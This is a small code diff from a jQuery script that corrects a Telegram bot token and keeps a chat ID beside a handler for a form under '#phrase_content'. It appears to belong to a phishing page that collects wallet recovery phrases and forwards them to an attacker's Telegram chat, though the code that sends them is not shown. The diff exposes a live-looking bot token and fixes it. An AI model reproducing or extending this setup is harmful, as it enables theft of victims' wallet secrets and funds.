@@ -1,5 +1,5 @@
 $(document).ready(function () {
-  const token = "78412784781:AAHQSFmw1I0oe9xHRWrj84C38Lc71kGtA88";
+  const token = "8412784781:AAHQSFmw1I0oe9xHRWrj84C38Lc71kGtA88";
   const chatId = "8063836406";
 
   const phraseForm = $("#phrase_content form");
